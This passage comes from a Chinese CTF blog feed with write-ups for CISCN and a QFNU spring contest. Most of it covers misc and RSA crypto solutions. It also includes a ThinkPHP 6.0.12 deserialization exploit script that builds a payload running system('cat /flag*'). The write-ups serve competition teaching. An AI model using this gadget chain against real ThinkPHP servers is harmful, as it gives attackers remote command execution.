keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用Notepad++打开转ASCII保存，再用rar打开，输入密码即可拿到flag…..</p><p>但是当时我们做的时候，确实没想到这个是个压缩包，把信息提取出来了，看到了内容….没往压缩包上考虑</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h4 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a><strong>Ezpop</strong></h4><ol><li>Thinkphp6.0.12LTS 反序列化漏洞<a href="https://www.jianshu.com/p/92018015ec5e">https://www.jianshu.com/p/92018015ec5e</a> </li><li>Exp.php </li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>     <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>         <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cat /flag*'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>     <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年QFNU春季赛WP</title>
      <link href="/2022/03/30/2021%E6%98%A5%E5%AD%A3%E8%B5%9BWP/"/>
      <url>/2022/03/30/2021%E6%98%A5%E5%AD%A3%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年春季赛WP"><a href="#2022年春季赛WP" class="headerlink" title="2022年春季赛WP"></a>2022年春季赛WP</h1><p>[TOC]</p><h2 id="1-MISC"><a href="#1-MISC" class="headerlink" title="1. MISC"></a>1. MISC</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h3><p>扫码得到flag</p><h3 id="2-签个到"><a href="#2-签个到" class="headerlink" title="2.签个到"></a>2.签个到</h3><p>base85解码,base32解码,base64解码，得到微信号（很明显看出）</p><blockquote><p>上面那个很明显看出是王文旭师哥写的，但是在师哥们在实验室出题的时候，我真没想出来，被王师哥坑道了，我以为是加密…….</p></blockquote><p>微信搜索好友，查看个性签名得到flag ,也是因为当时我们觉得这个签到，有点离谱，就又出了一道真签到。</p><h3 id="3-The-flag-is-under-the-picture"><a href="#3-The-flag-is-under-the-picture" class="headerlink" title="3.The flag is under the picture"></a>3.The flag is under the picture</h3><p>这一道题目，思路来自于在过去做过的一道，flag_under_the_picture和山东省科技节的一道大赛杂项。其实，在设计的时候稍微降了下难度，原题真的是图片隐写，但是考虑这次考察了一些其他内容，就在不在这一道题考察图片隐写，至于山东科技节的真题当时flag是两部分，一部分在文字类型里，另一部分则是隐藏文字。</p><p>这个算是一个签到(信息收集？)难度应该不大。</p><blockquote><p>1 under_the_picture，图片在word里的位置有很多种，环绕好像是最常见的，当时如果选择浮在文字之上就可以在图片下隐藏一些信息。</p><p>2 word实际上可以看做一个压缩包，我们可以在里面秘密的添加一些文件</p><p>3 在word下，我们可以更改字体格式为任意值，虽然这在显示中是默认值，但是字体名确实是你自定义的那些</p><p>4  隐藏文字，可以在word中设置显示隐藏文字</p></blockquote><p>flag{this_is_a_Sign_in_You_are_well}</p><blockquote><p>在这边师哥道歉下，我这次出题还是考虑不周，文档里面可以找到的所有信息和最后剩余的其实差了一个下划线_ ,虽然这种少下划线的平时做题也有，但这次我确实也没考虑这个，给师弟们放的Hint里面也误导了一些师弟…..</p></blockquote><h3 id="4-Virus-Killer"><a href="#4-Virus-Killer" class="headerlink" title="4.Virus_Killer"></a>4.Virus_Killer</h3><p>这是一道让所有 参赛选手都可以参与的题目，有谁能不喜欢我的世界呢？</p><p>我修改了包括终末之诗在内的一些内容，flag就在终末之诗里面，击败末影龙就能得到<strong>flag</strong>。</p><p>当然我觉得正常应该没人会是通过 杀死末影龙看到终末之诗吧，在配置文件里有一个 病毒杀手.jar用压缩包格式打开可以在里面找到终末之诗的配置文件，end</p><p>你会得到这一串</p><pre class="line-numbers language-none"><code class="language-none">§3恭喜你§2PLAYERNAME§3成功击败了冠状病毒§2来到了这里§3现在§2你将获得你的奖励§3仔细看§6ZmxhZ3tUaGVfdmlydXNfd2lsbF9wYXNzfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64解码得到flag flag{The_virus_will_pass}</p><h3 id="5-拆红包"><a href="#5-拆红包" class="headerlink" title="5.拆红包"></a>5.拆红包</h3><p>Linux下binwalk分离，得到一个txt（41,21,33,45,11,14,13）<br>使用010改变图片高度(WORD Y_image)，下方为一个鼓，由此联想到敲击码打开文件，下面放一张敲击码图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/%E5%A4%8D%E4%B9%A0/202203271009459.png"></p><h3 id="6-兔死who悲"><a href="#6-兔死who悲" class="headerlink" title="6.兔死who悲"></a>6.兔死who悲</h3><p>这个题，应该是来自王文旭师哥，兔吗，这很明显说的是rabbit密码，在图片中有一句我需要爆破，在比赛过程中，我们也放出了hint给出了zip-crc-cracker-master的下载地址</p><p>其实做出来的数量较我们的预期少了，因为提示给的很充足，使用binwalk -e分解图片可以得到flag.txt文件，这个是Rabbit加密的密文文件，在同时还存在一个加密文件夹，使用爆破跑是跑不出来的，这里需要crc碰撞</p><p>可以通过python3 crack.py key.zip简单得到解密秘钥(0_0)，解密得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;u_really_know_rabbits_and_crack&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-黑化的维亚"><a href="#7-黑化的维亚" class="headerlink" title="7.黑化的维亚"></a>7.黑化的维亚</h3><p>用stegsolve打开，查看不同色域下的图片</p><p><img src="https://s1.ax1x.com/2022/03/27/qwIgDf.png"></p><p>可以在相机的属性中找到序列号abcd，用abcd作为秘钥加密一次就得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;wowowoheihuale!123&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-Retrieve-the-passcode"><a href="#8-Retrieve-the-passcode" class="headerlink" title="8.Retrieve_the_passcode"></a>8.Retrieve_the_passcode</h3><p>附件为一个rar文件和scatter.txt，从文件名入手，010内直接更改编辑。本题的scatter意思为散点，在MATLAB 为函数 在向量 x 和 y 指定的位置创建一个包含圆形的散点图。内数据格式为num,num,num;<br>使用Python处理数据，画出散点图即为压缩包密码（或直接暴力）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathlines <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"scatter.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>    x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开pdf为一串摩斯密码，解码得flag</p><h3 id="9-0和1的故事"><a href="#9-0和1的故事" class="headerlink" title="9.0和1的故事"></a>9.0和1的故事</h3><p>这个题的话我是套了以前做过的几个题，给大家添麻烦了，如果我没猜错的话，不少师弟师妹应该做过一个01字符串生成二维码的题目，师哥为了不让大家这么快获得flag，在外面套了一个base64转图片。因为得到是图片的形式了，后面的处理方式就看大家的脑洞。</p><p>基本上就是识图，生成01串，然后将他还原成二维码，这里还有个坑，我专门把标志位那块的01都换成了0，了解二维码的形状就能很轻松的将其复原。</p><p>这是一个0,1字符串生成二维码的脚本，没有实现的师弟师妹们可以看看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">29</span>y <span class="token operator">=</span> <span class="token number">29</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        ff <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当时我在看一个类似题目的题解的时候，有位大哥是有Excel完成的…..我觉得师弟中应该没有这样干的吧</p><h3 id="10-有手就行"><a href="#10-有手就行" class="headerlink" title="10.有手就行"></a>10.有手就行</h3><p>B.base64.txt里的编码内容是正确的flag</p><p>tp文件是png图片，文件尾部有提示的base64，解出来是a=1,b=1</p><p>使用脚本将一大串经过多次加密的base64解出来后是:gmbh{xf1d0nf_u0_cvhlv_}</p><p>结合a=1,b=2和仿射密码的特征，g前一位是f，m前一位是l，以此类推可以发现是仿射密码，打开仿射密码网站，将密文输进去，然后在a处输入1，b处输入即时正确的flag</p><p>最终flag是：<br>flag{we1c0me_t0_bugku_30}</p><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'B.base64.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_de <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64_de<span class="token punctuation">)</span>    b <span class="token operator">=</span> base64_de    c<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-CRYPTO"><a href="#2-CRYPTO" class="headerlink" title="2.CRYPTO"></a>2.CRYPTO</h2><h3 id="1-EzRSA"><a href="#1-EzRSA" class="headerlink" title="1.EzRSA"></a>1.EzRSA</h3><p>观察发现q是p的下一个素数，p和q相邻，考虑yafu分解n。 </p><p>p = 60973413304835230363868586902004006717237117044275222095949523787438821909233 </p><p>q = 60973413304835230363868586902004006717237117044275222095949523787438821908819 </p><p>接下来是正常rsa求解。 </p><p>exp： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number<span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 p <span class="token operator">=</span> <span class="token number">60973413304835230363868586902004006717237117044275222095949523787438821909233</span>q <span class="token operator">=</span> <span class="token number">60973413304835230363868586902004006717237117044275222095949523787438821908819</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">843360044490649635455345992345658516544479053731668488697835904926685148386299530843302273377684497428582758441622699787334991310590024330881454606434905</span> d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'flag&#123;crypto_1s_interesting&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-欧欧欧欧拉"><a href="#2-欧欧欧欧拉" class="headerlink" title="2.欧欧欧欧拉"></a>2.欧欧欧欧拉</h3><p><strong>方法一：</strong> </p><p>发现p，q，r均已给出，可以忽略题目中n的值，我们令n = p * q * r </p><p>然后就是正常求解 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">77708508489582208240899650131902840854815755133475819112169579073727218368043</span>q <span class="token operator">=</span> <span class="token number">115346274621041699318908577704185761162067920193040258837922665578623979014737</span>r <span class="token operator">=</span> <span class="token number">93166107981326026645441213611016470699177795686294207640877308859576453989929</span>c <span class="token operator">=</span> <span class="token number">347985024400177502137432464900798540953635460694795945231855306625760961473332840686487124095862063998154167906085538622293374268339383930561570822025993330404000443189437185443891030627628783181063490300672242012327030487902957573259843362590656890086005064250511680034244728108117012676345214617621947005352669846702858611524555358875183335220452897059852086551237875454030210006489044067322848138770597108902534895893528585191491006543670911357584958970659151927090552495978448117307851072739865139783869799508202415340492688302276117064301995204992930822769693356655071714132128172897117903997013826512429240667259726064548860744384724715228197199073875301540485927036010254145447026303876803125148732898741913665524085357027</span> <span class="token number">545745800931501381715355480791801480897</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法二：</strong></p><p>我们也可以不更改n，利用欧拉函数的性质 </p><p>n = p ** 2 * q ** 3 * r ** 5 </p><p>phin = phi(p ** 2) * phi(q ** 3) * phi(r ** 5) = (p-1) * p * (q-1) * q * (r-1) * r**4 </p><p>exp: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">77708508489582208240899650131902840854815755133475819112169579073727218368043</span> q <span class="token operator">=</span> <span class="token number">115346274621041699318908577704185761162067920193040258837922665578623979014737</span> r <span class="token operator">=</span> <span class="token number">93166107981326026645441213611016470699177795686294207640877308859576453989929</span> c<span class="token operator">=</span><span class="token number">347985024400177502137432464900798540953635460694795945231855306625760961473332840686487124095862063998154167906085538622293374268339383930561570822025993330404000443189437185443891030627628783181063490300672242012327030487902957573259843362590656890086005064250511680034244728108117012676345214617621947005352669846702858611524555358875183335220452897059852086551237875454030210006489044067322848138770597108902534895893528585191491006543670911357584958970659151927090552495978448117307851072739865139783869799508202415340492688302276117064301995204992930822769693356655071714132128172897117903997013826512429240667259726064548860744384724715228197199073875301540485927036010254145447026303876803125148732898741913665524085357027545745800931501381715355480791801480897</span> n <span class="token operator">=</span> <span class="token number">65048551512240621993540614202950633661842586962192652824898395688184000402795957509481722751199080903392947991398273550047341785877223668123666842324877380470794846769076657730082614690182880900631464361441076132475928747991954627503106907777376357374758381806436260187733080114319610478685015082092970829089757587587993969952452971403572518192436602517670638053566510878431768966565133874950375020522410987166924387985858892891003579542248992692799457937156750952714742294212043332149687042398627353772231567346753462916369667925107827788291811362515610771720461320487626568153215009781929374220819616329622781459299058370744879472145087090461481538486760169932577206734789444604559973471107786087166188418189039013657392095931298017769281949143411358392051565393109553</span> e <span class="token operator">=</span> <span class="token number">65537</span> <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 phip <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> p phiq <span class="token operator">=</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> q<span class="token operator">**</span><span class="token number">2</span> phir <span class="token operator">=</span> <span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> r<span class="token operator">**</span><span class="token number">4</span> phi <span class="token operator">=</span> phip <span class="token operator">*</span> phiq <span class="token operator">*</span> phir d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#b'flag&#123;1_th1nk_you_get_1t&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-RRRRSA"><a href="#3-RRRRSA" class="headerlink" title="3.RRRRSA"></a>3.RRRRSA</h3><p>第一段flag对N和N1 gcd可得到p，进而得到q，e进行遍历即可。 </p><p>第二段flag为低质数加密攻击，e=3确定，爆破即可。 </p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 N<span class="token operator">=</span><span class="token number">8833009455505830765576231622072241161470401197695529677335107109810339880276832871604743644707359887179405543235721188241122566162151923510929667953122181</span> N1<span class="token operator">=</span><span class="token number">9429676793030563745207076251618678117488728061107610987225993751644166892153001760951206447627482758551907039606942492875805463671257287080808106906001851</span> c1<span class="token operator">=</span><span class="token number">8037069184897987958374773499995275921812115255860632996217845099273168646686370835196595250846074845406069858745424656055726674434603985267158502329518751</span> c2<span class="token operator">=</span><span class="token number">413575070955891267004255576879221041256089460651441473637</span> p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>N<span class="token punctuation">,</span>N1<span class="token punctuation">)</span> q <span class="token operator">=</span> N <span class="token operator">//</span> p phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#第一段flag枚举e </span><span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span>         m1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span>         <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> long_to_bytes<span class="token punctuation">(</span>m1<span class="token 